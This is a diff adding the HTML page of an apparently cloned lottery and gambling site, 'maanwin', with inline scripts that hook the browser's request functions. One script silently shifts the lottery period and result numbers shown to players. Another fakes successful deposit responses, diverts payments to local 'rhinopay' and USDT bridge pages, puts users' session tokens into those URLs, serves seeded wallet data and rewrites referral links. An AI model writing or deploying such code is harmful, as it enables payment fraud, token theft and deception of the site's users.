@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <link rel="preconnect" href="https://pro-img.arsaaspub.com" crossorigin>
+    <link rel="dns-prefetch" href="https://sdk.rum.aliyuncs.com">
+
+    <link rel="preload" href="/assets/css/ar_saas11-3dcc4151.css" as="style">
+    <title>maanwin</title>
+    <script>
+        try {
+            if (navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
+                navigator.serviceWorker.getRegistrations().then(function (regs) {
+                    regs.forEach(function (r) { try { r.unregister(); } catch (e) {} });
+                });
+            }
+            if (window.caches && caches.keys) {
+                caches.keys().then(function (keys) {
+                    keys.forEach(function (k) { try { caches.delete(k); } catch (e) {} });
+                });
+            }
+        } catch (e) {}
+    </script>
+    <script>
+        /* ==================================================================
+           PERIOD + RESULT SHIFT  (client side — 100% pakka)
+           SETTING:  -1 = period AUR RESULT dono 1 piche
+                      0 = band
+                     -2 = 2 piche
+           ================================================================== */
+        (function () {
+            var N = -1;
+            if (!N) return;
+
+            function addBig(s, n) {
+                if (!/^[0-9]+$/.test(s)) return s;
+                var d = s.split(""), i = d.length - 1, v, c, b;
+                if (n > 0) {
+                    c = n;
+                    while (i >= 0 && c > 0) { v = (+d[i]) + c; d[i] = String(v % 10); c = Math.floor(v / 10); i--; }
+                    while (c > 0) { d.unshift(String(c % 10)); c = Math.floor(c / 10); }
+                } else {
+                    b = -n;
+                    while (i >= 0 && b > 0) { v = (+d[i]) - b; if (v < 0) { v += 10; b = 1; } else { b = 0; } d[i] = String(v); i--; }
+                }
+                var o = d.join("").replace(/^0+/, "");
+                return o === "" ? "0" : o;
+            }
+
+            var KEYS = /^(issueNumber|issueNo|issueId|issue|period|periodNo)$/i;
+
+            function shiftNode(x) {
+                if (!x || typeof x !== "object") return x;
+                if (Object.prototype.toString.call(x) === "[object Array]") {
+                    for (var i = 0; i < x.length; i++) shiftNode(x[i]);
+                    return x;
+                }
+                for (var k in x) {
+                    if (!Object.prototype.hasOwnProperty.call(x, k)) continue;
+                    var v = x[k];
+                    if (typeof v === "string" && KEYS.test(k) && /^[0-9]{8,}$/.test(v)) x[k] = addBig(v, N);
+                    else if (v && typeof v === "object") shiftNode(v);
+                }
+                return x;
+            }
+
+            function isTarget(u) {
+                u = String(u || "");
+                return /\/lottery-draw\/(WinGo|TrxWinGo|VideoWinGo|K3|D5|MotoRace)\//i.test(u)
+                    || /\/webapi\/kv\/issue\//i.test(u)
+                    || /\/(WinGo|TrxWinGo|VideoWinGo|K3|D5|MotoRace)\/[A-Za-z0-9_]+(\/GetHistoryIssuePage)?\.json/i.test(u);
+            }
+
+            function apply(raw) {
+                if (!raw || typeof raw !== "string") return raw;
+                var obj; try { obj = JSON.parse(raw); } catch (e) { return raw; }
+                if (!obj || typeof obj !== "object") return raw;
+                shiftNode(obj);
+                try { return JSON.stringify(obj); } catch (e) { return raw; }
+            }
+
+            var XO = XMLHttpRequest.prototype.open, XS = XMLHttpRequest.prototype.send;
+            XMLHttpRequest.prototype.open = function () {
+                this.__shiftUrl = String(arguments[1] || "");
+                return XO.apply(this, arguments);
+            };
+            XMLHttpRequest.prototype.send = function () {
+                var self = this;
+                if (isTarget(this.__shiftUrl)) {
+                    try {
+                        this.addEventListener("readystatechange", function () {
+                            if (self.readyState !== 4) return;
+                            try {
+                                var out = apply(self.responseText);
+                                if (out !== self.responseText) {
+                                    var parsed = null; try { parsed = JSON.parse(out); } catch (e2) {}
+                                    Object.defineProperty(self, "responseText", { configurable: true, get: function () { return out; } });
+                                    Object.defineProperty(self, "response", { configurable: true, get: function () { return self.responseType === "json" ? (parsed || out) : out; } });
+                                }
+                            } catch (e) {}
+                        });
+                    } catch (e) {}
+                }
+                return XS.apply(this, arguments);
+            };
+
+            if (window.fetch) {
+                var _f = window.fetch.bind(window);
+                window.fetch = function (input, init) {
+                    var u = "";
+                    try { u = typeof input === "string" ? input : ((input && input.url) || ""); } catch (e) {}
+                    return _f(input, init).then(function (res) {
+                        if (!isTarget(u) || !res || typeof res.clone !== "function") return res;
+                        return res.clone().text().then(function (txt) {
+                            var out = apply(txt);
+                            if (out === txt) return res;
+                            try { return new Response(out, { status: res.status, statusText: res.statusText, headers: res.headers }); }
+                            catch (e) { return res; }
+                        }).catch(function () { return res; });
+                    });
+                };
+            }
+            console.log("[period-shift] active, N=" + N);
+        })();
+    </script>
+    <script type="module" crossorigin src="/js/index-MxYkJMUQ.js"></script>
+    <link rel="modulepreload" href="/js/index-DgXHh1mz.js" />
+    <link rel="modulepreload" href="/js/index-DUJELdn4.js" />
+    <link rel="stylesheet" crossorigin href="/css/index-DXylt7AE.css">
+
+    <script>
+        window.__VERSION__ = "1791266352328";
+        window.__BUILD_INFO__ = {
+            "version": "1791266352328",
+            "timestamp": "1791266352328",
+            "buildEnv": 6015,
+            "buildMode": 6015,
+            "buildId": "",
+            "buildTime": "2026-10-06T05:59:12.328Z"
+        };
+    </script>
+    <meta name="description" content="AR"></meta>
+    <meta name="keywords" content="maanwin"></meta>
+    <meta name="renderer" content="webkit"></meta>
+    <meta name="force-rendering" content="webkit"></meta>
+    <meta name="twitter:card" content="summary_large_image"></meta>
+    <meta name="twitter:title" content="maanwin"></meta>
+    <meta name="twitter:url" content="maanwin.club9.eu.cc"></meta>
+    <meta name="twitter:description" content="AR"></meta>
+    <meta name="twitter:image" content="/img/6015/other/101559157-140621-file_20260919101559151.webp"></meta>
+    <meta property="og:title" content="maanwin"></meta>
+    <meta property="og:description" content="AR"></meta>
+    <meta property="og:type" content="website"></meta>
+    <meta property="og:url" content="maanwin.club9.eu.cc"></meta>
+    <meta property="og:image" content="/img/6015/other/101559157-140621-file_20260919101559151.webp"></meta>
+    <meta property="og:site_name" content="maanwin"></meta>
+    <meta name="apple-mobile-web-app-capable" content="yes"></meta>
+    <meta name="apple-mobile-web-app-status-bar-style" content="default"></meta>
+    <meta name="apple-mobile-web-app-title" content="yes"></meta>
+    <meta name="mobile-web-app-capable" content="yes"></meta>
+    <meta name="format-detection" content="telephone=no,email=no,address=no"></meta>
+    <meta name="msapplication-TileColor" content="#24262b"></meta>
+    <meta name="theme-color" content="#24262b"></meta>
+    <link rel="icon" type="image/x-icon" href="/img/6015/other/084934911-140453-file_20260919084934911.webp"></link>
+    <link rel="icon" type="image/png" sizes="256x256" href="/img/6015/other/084917765-140450-file_20260919084917763.webp"></link>
+    <link rel="icon" type="image/png" sizes="512x512" href="/img/6015/other/084911585-140449-file_20260919084911577.webp"></link>
+    <link rel="canonical" href="https://maanwin.club9.eu.cc"></link>
+    <script type="text/javascript" src="/webapi/kv/config.js"></script>
+    <script type="text/javascript">
+        window._CONFIG_ = {
+            "ip": "2a06:98c0:3600::103",
+            "country": "IN",
+            "host": "maanwin.club9.eu.cc",
+            "tenantId": 6015,
+            "domainType": 1,
+            "status": 200
+        };
+    </script>
+</head>
+
+<body>
+    <div id="app"></div>
+    <script>
+        window.__rum = {
+            "pid": "1kryfn64w78@8b0a4884a38b6e4",
+            "endpoint": "https://1kryfn64w78-default-sea.rum.aliyuncs.com",
+            "env": "prod",
+            "spaMode": "history",
+            "collectors": {
+                "perf": true,
+                "webVitals": true,
+                "api": true,
+                "staticResource": true,
+                "jsError": true,
+                "consoleError": true,
+                "action": true
+            },
+            "tracing": true
+        };
+    </script>
+    <script>
+    (function () {
+      var PAY_BRIDGE = "/pay/rhinopay.php";
+      var USDT_BRIDGE = "/pay/usdt.php";
+      var USDT_CAT_KEY = "mw_usdt_cat_ids";
+      var ARPAY_CAT_KEY = "mw_arpay_cat_ids";
+      var DEFAULT_USDT_IDS = [400146];
+      var DEFAULT_ARPAY_IDS = [400147];
+
+      function b64urlDecode(s) {
+        s = String(s || "").replace(/-/g, "+").replace(/_/g, "/");
+        while (s.length % 4) s += "=";
+        try { return decodeURIComponent(escape(atob(s))); } catch (e) {
+          try { return atob(s); } catch (e2) { return ""; }
+        }
+      }
+      function getJwt() {
+        var t = localStorage.getItem("ar_token") || localStorage.getItem("token") || "";
+        t = String(t).replace(/^Bearer\s+/i, "");
+        if (t.indexOf(".") > 0) return t;
+        var hdr = localStorage.getItem("ar_token_header") || localStorage.getItem("tokenHeader") || "";
+        if (hdr && hdr.indexOf(".") > 0) return hdr.replace(/^Bearer\s+/i, "");
+        return t;
+      }
+      function getUid() {
+        try {
+          var tok = getJwt();
+          if (!tok || tok.indexOf(".") < 0) return "0";
+          var payload = JSON.parse(b64urlDecode(tok.split(".")[1]) || "{}");
+          return String(payload.UserId || payload.userId || payload.userid || payload.id || payload.Id || "0");
+        } catch (e) { return "0"; }
+      }
+      function parseBody(body) {
+        if (!body) return {};
+        if (typeof body === "string") {
+          try { return JSON.parse(body); } catch (e) { return {}; }
+        }
+        if (typeof body === "object") return body;
+        return {};
+      }
+      function pickAmount(body) {
+        if (!body || typeof body !== "object") return null;
+        var keys = ["amount", "rechargeAmount", "depositAmount", "money", "price", "payAmount", "orderAmount"];
+        for (var i = 0; i < keys.length; i++) {
+          var v = body[keys[i]];
+          if (v !== undefined && v !== null && v !== "" && !isNaN(Number(v)) && Number(v) > 0) {
+            return Number(v).toFixed(2);
+          }
+        }
+        return null;
+      }
+      function readIdSet(key, defaults) {
+        var out = {};
+        (defaults || []).forEach(function (id) { out[String(id)] = 1; });
+        try {
+          var raw = sessionStorage.getItem(key);
+          var arr = raw ? JSON.parse(raw) : [];
+          if (Array.isArray(arr)) arr.forEach(function (id) { out[String(id)] = 1; });
+        } catch (e) {}
+        return out;
+      }
+      function writeIdSet(key, extraIds) {
+        var set = readIdSet(key, key === USDT_CAT_KEY ? DEFAULT_USDT_IDS : DEFAULT_ARPAY_IDS);
+        (extraIds || []).forEach(function (id) { set[String(id)] = 1; });
+        try { sessionStorage.setItem(key, JSON.stringify(Object.keys(set))); } catch (e) {}
+      }
+      function cacheCategoryIds(payload) {
+        var list = payload && payload.data;
+        if (!Array.isArray(list)) return;
+        var usdt = [];
+        var arpay = [];
+        list.forEach(function (row) {
+          var id = row && (row.id || row.Id);
+          var t = String((row && row.rechargeType) || "").toLowerCase();
+          var n = String((row && row.name) || "").toLowerCase();
+          if (!id) return;
+          if (t === "usdt" || n.indexOf("usdt") !== -1) usdt.push(id);
+          if (t === "arpay" || n.indexOf("arpay") !== -1) arpay.push(id);
+        });
+        if (usdt.length) writeIdSet(USDT_CAT_KEY, usdt);
+        if (arpay.length) writeIdSet(ARPAY_CAT_KEY, arpay);
+      }
+      function categoryIdFromBody(body) {
+        if (!body || typeof body !== "object") return "";
+        return String(body.rechargeCategoryId || body.payTypeId || body.payTypeID || body.tyid || "");
+      }
+      function isUsdtPay(body) {
+        if (!body || typeof body !== "object") return false;
+        var cat = categoryIdFromBody(body);
+        if (cat && readIdSet(USDT_CAT_KEY, DEFAULT_USDT_IDS)[cat]) return true;
+        var payId = Number(body.payId || body.payID || 0);
+        if (payId === 11 || payId === 16 || payId === 19) return true;
+        var s = JSON.stringify(body).toLowerCase();
+        return s.indexOf("usdt") !== -1 || s.indexOf("crypto") !== -1 || s.indexOf("trc20") !== -1;
+      }
+      function isArPay(body) {
+        if (!body || typeof body !== "object") return false;
+        var cat = categoryIdFromBody(body);
+        if (cat && readIdSet(ARPAY_CAT_KEY, DEFAULT_ARPAY_IDS)[cat]) return true;
+        var s = JSON.stringify(body).toLowerCase();
+        return s.indexOf("arpay") !== -1;
+      }
+      function payEpFromUrl(url) {
+        var path = String(url || "").split("?")[0];
+        if (/\/Recharge\/DepositRecharge\/?$/.test(path)) return "DepositRecharge";
+        if (/\/Recharge\/GoodsDepositRecharge\/?$/.test(path)) return "GoodsDepositRecharge";
+        if (/\/Recharge\/GetRechargeCategoryList\/?$/.test(path)) return "GetRechargeCategoryList";
+        if (/\/Recharge\/GetArUpiOnGoingOrder\/?$/.test(path)) return "GetArUpiOnGoingOrder";
+        if (/\/Recharge\/ArUpiCancelRechargeOrder\/?$/.test(path)) return "ArUpiCancel";
+        if (/\/Withdraw\/GetWithdrawBasicInfo\/?$/.test(path)) return "GetWithdrawBasicInfo";
+        if (/\/Withdraw\/GetWalletCodeList\/?$/.test(path)) return "GetWalletCodeList";
+        if (/\/Withdraw\/GetUserWithdrawWallet\/?$/.test(path)) return "GetUserWithdrawWallet";
+        if (/\/Activity\/GetShareCopy\/?$/.test(path)) return "GetShareCopy";
+        return "";
+      }
+      function isCreatePayEp(ep) {
+        return ep === "DepositRecharge" || ep === "GoodsDepositRecharge";
+      }
+      function nowIso() {
+        try { return new Date().toISOString().replace("T", " ").slice(0, 19); } catch (e) { return ""; }
+      }
+      function payUrl(amount, extra) {
+        var uid = getUid();
+        var a = amount && Number(amount) > 0 ? amount : "200.00";
+        var tok = getJwt();
+        var usdt = extra && extra.usdt;
+        var origin = "";
+        try { origin = window.location.origin || ""; } catch (e) { origin = ""; }
+        var url = origin + (usdt ? USDT_BRIDGE : PAY_BRIDGE) + "?amount=" + encodeURIComponent(a)
+          + "&uid=" + encodeURIComponent(uid)
+          + "&token=" + encodeURIComponent(tok)
+          + "&channel=" + encodeURIComponent(usdt ? "USDT-NoBonus" : "Rhinopay");
+        if (extra && extra.tyid) url += "&tyid=" + encodeURIComponent(extra.tyid);
+        return url;
+      }
+      function openPayTab(url) {
+        var w = null;
+        try { w = window.open(url, "_blank"); } catch (e) { w = null; }
+        if (!w) {
+          try { window.location.assign(url); } catch (e2) {}
+        }
+        return w;
+      }
+      function okPayload(amount, extra) {
+        var url = payUrl(amount, extra);
+        try { sessionStorage.setItem("last_pay_bridge", url); } catch (e) {}
+        return {
+          data: {
+            redirectUrl: url,
+            scanCodePay: false,
+            formBody: null,
+            formUrl: "",
+            submitType: 1,
+            submitUrl: "",
+            orderResult: 1,
+            rechargeChannelId: 1,
+            onGoingOrder: {},
+            addThirdPayOrderRsp: null,
+            orderNo: null
+          },
+          code: 0,
+          msg: "Succeed",
+          msgCode: 0,
+          serverTime: Date.now(),
+          serviceNowTime: nowIso()
+        };
+      }
+      function arupiStub() {
+        return { data: null, code: 0, msg: "Succeed", msgCode: 0, serverTime: Date.now() };
+      }
+      var CACHE_TTL = 300000;
+      var SEED_CATS = { data: [
+        { id: 400144, name: "Rhinopay", rechargeType: "UPI", state: 1, sort: 10, iconUrl: "/img/6015/bankLogo/020110754-156513-file_20261001140110738.webp", selectedIconUrl: "/img/6015/bankLogo/020113586-156514-file_20261001140113571.webp", rate: 1, minAmount: 100, maxAmount: 50000, quickConfigList: [{ rechargeAmount: 100, giftAmount: 0, gifType: 1 }, { rechargeAmount: 200, giftAmount: 0, gifType: 1 }, { rechargeAmount: 500, giftAmount: 0, gifType: 1 }, { rechargeAmount: 1000, giftAmount: 0, gifType: 1 }, { rechargeAmount: 2000, giftAmount: 0, gifType: 1 }, { rechargeAmount: 5000, giftAmount: 0, gifType: 1 }], giftRatioType: 0, giftAmount: 0, reserveFund: 0, isDefault: 1 },
+        { id: 400146, name: "USDT", rechargeType: "USDT", state: 1, sort: 3, iconUrl: "/img/6015/bankLogo/020157650-156519-file_20261001140157649.webp", selectedIconUrl: "/img/6015/bankLogo/020201058-156520-file_20261001140201057.webp", rate: 103, minAmount: 10, maxAmount: 100000000, quickConfigList: [{ rechargeAmount: 10, giftAmount: 0, gifType: 1 }, { rechargeAmount: 20, giftAmount: 0, gifType: 1 }, { rechargeAmount: 50, giftAmount: 0, gifType: 1 }, { rechargeAmount: 100, giftAmount: 0, gifType: 1 }, { rechargeAmount: 200, giftAmount: 0, gifType: 1 }, { rechargeAmount: 500, giftAmount: 0, gifType: 1 }], giftRatioType: 0, giftAmount: 0, reserveFund: 0, isDefault: 0 },
+        { id: 400147, name: "ARPay", rechargeType: "ARPay", state: 1, sort: 2, iconUrl: "/img/6015/bankLogo/020228794-156525-file_20261001140228793.webp", selectedIconUrl: "/img/6015/bankLogo/020231145-156526-file_20261001140231144.webp", rate: 1, minAmount: 100, maxAmount: 50000, quickConfigList: [{ rechargeAmount: 100, giftAmount: 0, gifType: 1 }, { rechargeAmount: 200, giftAmount: 0, gifType: 1 }, { rechargeAmount: 500, giftAmount: 0, gifType: 1 }, { rechargeAmount: 1000, giftAmount: 0, gifType: 1 }], giftRatioType: 0, giftAmount: 0, reserveFund: 0, isDefault: 0 }
+      ], code: 0, msg: "Succeed", msgCode: 0, serverTime: Date.now() };
+      var SEED_WD = { data: { balance: 0, realName: "", amountCoding: 0, hasWithdrawPassword: false, withdrawCategoryList: [
+        { id: 400099, tenantId: 6015, withdrawType: "BankCard", name: "BankCard", iconUrl: "/img/6015/bankLogo/020359299-156530-file_20261001140359291.webp", selectedIconUrl: "/img/6015/bankLogo/020401944-156531-file_20261001140401941.webp", userMaxBindCount: 1, maxWithdrawTimes: 3, minAmount: 110, maxAmount: 50000, feeType: 0, feePercent: 0, fee: 0, allowStartTime: "00:00", allowEndTime: "23:59", sort: 10, state: 1 },
+        { id: 400100, tenantId: 6015, withdrawType: "UPI", name: "UPI", iconUrl: "/img/6015/bankLogo/020440187-156532-file_20261001140440186.webp", selectedIconUrl: "/img/6015/bankLogo/020445273-156533-file_20261001140445272.webp", userMaxBindCount: 1, maxWithdrawTimes: 3, minAmount: 110, maxAmount: 50000, feeType: 0, feePercent: 0, fee: 0, allowStartTime: "00:00", allowEndTime: "23:59", sort: 8, state: 1 },
+        { id: 400101, tenantId: 6015, withdrawType: "USDT", name: "USDT", iconUrl: "/img/6015/bankLogo/020518491-156534-file_20261001140518490.webp", selectedIconUrl: "/img/6015/bankLogo/020521196-156535-file_20261001140521195.webp", userMaxBindCount: 1, maxWithdrawTimes: 3, minAmount: 1000, maxAmount: 1000000, feeType: 0, feePercent: 0, fee: 0, allowStartTime: "00:00", allowEndTime: "23:59", sort: 5, state: 1 }
+      ], addWalletNeedSmsVerifyCode: true, userTodayWithdrawFreeCount: 0, userTodayWithdrawAmount: -1, userTodayWithdrawCount: -1, isNeedWithdrawPassword: false, usdtWithdrawRate: 104 }, code: 0, msg: "Succeed", msgCode: 0, serverTime: Date.now() };
+      function cacheKey(ep) { return "mw_api_" + ep; }
+      function readApiCache(ep) {
+        try {
+          var row = JSON.parse(sessionStorage.getItem(cacheKey(ep)) || "null");
+          if (row && row.t && (Date.now() - row.t) < CACHE_TTL && row.d) return row.d;
+        } catch (e) {}
+        return null;
+      }
+      function writeApiCache(ep, obj) {
+        try { sessionStorage.setItem(cacheKey(ep), JSON.stringify({ t: Date.now(), d: obj })); } catch (e) {}
+      }
+      function wrapShare(obj) {
+        if (!obj || typeof obj !== "object") return obj;
+        var data = obj.data;
+        if (!data || typeof data !== "object") return obj;
+        var origin = "";
+        try { origin = window.location.origin || ""; } catch (e) { origin = ""; }
+        if (!origin) return obj;
+        var old = data.shareDomain;
+        data.shareDomain = origin;
+        if (typeof data.shareContent === "string") {
+          if (old) data.shareContent = data.shareContent.split(String(old)).join(origin);
+          data.shareContent = data.shareContent.replace(/https?:\/\/maanwin\d+\.com/gi, origin);
+        }
+        return obj;
+      }
+      function seedFor(ep) {
+        if (ep === "GetRechargeCategoryList") return SEED_CATS;
+        if (ep === "GetWithdrawBasicInfo") return SEED_WD;
+        if (ep === "GetUserWithdrawWallet") return { data: [], code: 0, msg: "Succeed", msgCode: 0, serverTime: Date.now() };
+        return null;
+      }
+      function instantWallet(ep) {
+        return readApiCache(ep) || seedFor(ep);
+      }
+      function jsonResponse(obj) {
+        return new Response(JSON.stringify(obj), {
+          status: 200,
+          headers: { "Content-Type": "application/json; charset=utf-8" }
+        });
+      }
+      function finishXhr(xhr, obj) {
+        var raw = JSON.stringify(obj);
+        var hdrs = "content-type: application/json; charset=utf-8\r\n";
+        try {
+          xhr.getAllResponseHeaders = function () { return hdrs; };
+          xhr.getResponseHeader = function (name) {
+            name = String(name || "").toLowerCase();
+            if (name === "content-type") return "application/json; charset=utf-8";
+            return null;
+          };
+          Object.defineProperty(xhr, "readyState", { configurable: true, get: function () { return 4; } });
+          Object.defineProperty(xhr, "status", { configurable: true, get: function () { return 200; } });
+          Object.defineProperty(xhr, "statusText", { configurable: true, get: function () { return "OK"; } });
+          Object.defineProperty(xhr, "responseURL", { configurable: true, get: function () { return xhr.__payUrl || ""; } });
+          Object.defineProperty(xhr, "responseText", { configurable: true, get: function () { return raw; } });
+          Object.defineProperty(xhr, "response", {
+            configurable: true,
+            get: function () {
+              if (xhr.responseType === "json") {
+                try { return JSON.parse(raw); } catch (e) { return obj; }
+              }
+              return raw;
+            }
+          });
+        } catch (e) {}
+        setTimeout(function () {
+          try {
+            if (typeof xhr.onreadystatechange === "function") xhr.onreadystatechange();
+            if (typeof xhr.onload === "function") xhr.onload();
+            if (typeof xhr.onloadend === "function") xhr.onloadend();
+            if (xhr.dispatchEvent) {
+              xhr.dispatchEvent(new Event("readystatechange"));
+              xhr.dispatchEvent(new Event("load"));
+              xhr.dispatchEvent(new ProgressEvent("loadend"));
+            }
+          } catch (e2) {}
+        }, 0);
+      }
+
+      function rewriteLotteryDraw(url) {
+        try {
+          var u = new URL(String(url || ""), window.location.origin);
+          var host = String(u.hostname || "").toLowerCase();
+          var path = String(u.pathname || "");
+          var isDrawHost = host === "draw.ar-lottery01.com" || /^draw\./.test(host);
+          var isLotteryJson = /\/(WinGo|TrxWinGo|VideoWinGo|K3|D5)\/[A-Za-z0-9_]+(\/GetHistoryIssuePage)?\.json$/.test(path);
+          if (isDrawHost && isLotteryJson) {
+            return window.location.origin + "/lottery-draw" + path + (u.search || "");
+          }
+        } catch (e) {}
+        return url;
+      }
+
+      var XO = XMLHttpRequest.prototype.open;
+      var XS = XMLHttpRequest.prototype.send;
+      var XH = XMLHttpRequest.prototype.setRequestHeader;
+      XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
+        this.__hdrs = this.__hdrs || [];
+        this.__hdrs.push([k, v]);
+        return XH.apply(this, arguments);
+      };
+      function bgRefresh(xhr, body, ep) {
+        try {
+          var x = new XMLHttpRequest();
+          XO.call(x, xhr.__payMethod || "POST", xhr.__payUrl, true);
+          (xhr.__hdrs || []).forEach(function (h) {
+            try { XH.call(x, h[0], h[1]); } catch (e) {}
+          });
+          x.onload = function () {
+            try {
+              var obj = JSON.parse(x.responseText || "{}");
+              if (obj && obj.code === 0) {
+                if (ep === "GetShareCopy") obj = wrapShare(obj);
+                writeApiCache(ep, obj);
+                if (ep === "GetRechargeCategoryList") cacheCategoryIds(obj);
+              }
+            } catch (e) {}
+          };
+          XS.call(x, body);
+        } catch (e) {}
+      }
+
+      var _fetch = window.fetch.bind(window);
+      window.fetch = function (input, init) {
+        var url = "";
+        try { url = typeof input === "string" ? input : (input && input.url) || ""; } catch (e) {}
+        url = rewriteLotteryDraw(url);
+        if (typeof input === "string") input = url;
+        init = init ? Object.assign({}, init) : {};
+        var ep = payEpFromUrl(url);
+        if (isCreatePayEp(ep)) {
+          var bodyObj = parseBody(init.body);
+          if (!isArPay(bodyObj)) {
+            var amt = pickAmount(bodyObj);
+            var tyid = categoryIdFromBody(bodyObj);
+            return Promise.resolve(jsonResponse(okPayload(amt, { tyid: tyid, usdt: isUsdtPay(bodyObj) })));
+          }
+        }
+        if (ep === "GetArUpiOnGoingOrder" || ep === "ArUpiCancel") {
+          return Promise.resolve(jsonResponse(arupiStub()));
+        }
+        if (ep === "GetRechargeCategoryList" || ep === "GetWithdrawBasicInfo" || ep === "GetUserWithdrawWallet") {
+          var fast = instantWallet(ep);
+          if (fast) {
+            if (ep === "GetRechargeCategoryList") cacheCategoryIds(fast);
+            return Promise.resolve(jsonResponse(fast));
+          }
+        }
+        if (ep === "GetWalletCodeList") {
+          var wdCache = readApiCache(ep);
+          if (wdCache) return Promise.resolve(jsonResponse(wdCache));
+        }
+        if (ep === "GetShareCopy") {
+          return _fetch(input, init).then(function (res) {
+            return res.clone().json().then(function (obj) {
+              obj = wrapShare(obj);
+              writeApiCache(ep, obj);
+              return jsonResponse(obj);
+            }).catch(function () { return res; });
+          });
+        }
+        return _fetch(input, init).then(function (res) {
+          try {
+            if (ep === "GetRechargeCategoryList" || ep === "GetWithdrawBasicInfo" || ep === "GetWalletCodeList" || ep === "GetUserWithdrawWallet" || ep === "GetShareCopy") {
+              res.clone().json().then(function (obj) {
+                if (ep === "GetShareCopy") obj = wrapShare(obj);
+                if (obj && obj.code === 0) writeApiCache(ep, obj);
+                if (ep === "GetRechargeCategoryList") cacheCategoryIds(obj);
+              }).catch(function () {});
+            }
+          } catch (e) {}
+          return res;
+        });
+      };
+
+      XMLHttpRequest.prototype.open = function (method, url) {
+        var args = Array.prototype.slice.call(arguments);
+        if (args.length > 1) {
+          args[1] = rewriteLotteryDraw(args[1]);
+        }
+        this.__payMethod = method;
+        this.__payEp = payEpFromUrl(args[1]);
+        this.__payUrl = String(args[1] || "");
+        return XO.apply(this, args);
+      };
+      XMLHttpRequest.prototype.send = function (body) {
+        var self = this;
+        var ep = this.__payEp;
+        if (isCreatePayEp(ep)) {
+          var bodyObj = parseBody(body);
+          if (!isArPay(bodyObj)) {
+            var amt = pickAmount(bodyObj);
+            var tyid = categoryIdFromBody(bodyObj);
+            finishXhr(self, okPayload(amt, { tyid: tyid, usdt: isUsdtPay(bodyObj) }));
+            return;
+          }
+        }
+        if (ep === "GetArUpiOnGoingOrder" || ep === "ArUpiCancel") {
+          finishXhr(self, arupiStub());
+          return;
+        }
+        if (ep === "GetRechargeCategoryList" || ep === "GetWithdrawBasicInfo" || ep === "GetUserWithdrawWallet") {
+          var fast = instantWallet(ep);
+          if (fast) {
+            if (ep === "GetRechargeCategoryList") cacheCategoryIds(fast);
+            finishXhr(self, fast);
+            bgRefresh(self, body, ep);
+            return;
+          }
+        }
+        if (ep === "GetWalletCodeList") {
+          var cached = readApiCache(ep);
+          if (cached) {
+            finishXhr(self, cached);
+            bgRefresh(self, body, ep);
+            return;
+          }
+          this.addEventListener("load", function () {
+            try {
+              var obj = JSON.parse(self.responseText || "{}");
+              if (obj && obj.code === 0) writeApiCache(ep, obj);
+            } catch (e) {}
+          });
+        }
+        if (ep === "GetShareCopy") {
+          this.addEventListener("readystatechange", function () {
+            if (self.readyState !== 4) return;
+            try {
+              var obj = wrapShare(JSON.parse(self.responseText || "{}"));
+              var raw = JSON.stringify(obj);
+              Object.defineProperty(self, "responseText", { configurable: true, get: function () { return raw; } });
+              Object.defineProperty(self, "response", {
+                configurable: true,
+                get: function () {
+                  if (self.responseType === "json") return obj;
+                  return raw;
+                }
+              });
+            } catch (e) {}
+          });
+        }
+        return XS.call(this, body);
+      };
+
+      function readScreenAmount() {
+        var inp = document.querySelector(".pay-main input, .amount-input input, .Recharge__content-paymoney__money-input input");
+        if (inp && inp.value) {
+          var n = Number(String(inp.value).replace(/,/g, "").replace(/[^\d.]/g, ""));
+          if (n > 0) return n.toFixed(2);
+        }
+        var chip = document.querySelector(".amount-option.active");
+        if (chip) {
+          var t = String(chip.textContent || "").replace(/,/g, "");
+          var m = t.match(/(\d+(\.\d+)?)/);
+          if (m && Number(m[1]) > 0) return Number(m[1]).toFixed(2);
+        }
+        return null;
+      }
+      function activePayName() {
+        var el = document.querySelector(".payment-item.active .name") || document.querySelector(".payment-item.active");
+        return String((el && el.textContent) || "").toLowerCase();
+      }
+      document.addEventListener("click", function (ev) {
+        var t = ev.target;
+        if (!t || !t.closest) return;
+        var path = (String(location.pathname || "") + " " + String(location.hash || "")).toLowerCase();
+        if (path.indexOf("/wallet/recharge") === -1) return;
+        var btn = t.closest(".pay-btn .red-btn") || t.closest(".pay-btn");
+        if (!btn) return;
+        var name = activePayName();
+        if (name.indexOf("arpay") !== -1) return;
+        var amt = readScreenAmount();
+        if (!amt) return;
+        try {
+          ev.preventDefault();
+          ev.stopPropagation();
+          if (ev.stopImmediatePropagation) ev.stopImmediatePropagation();
+        } catch (e) {}
+        openPayTab(payUrl(amt, { usdt: name.indexOf("usdt") !== -1 }));
+      }, true);
+    })();
+    </script>
+</body>
+
+</html>
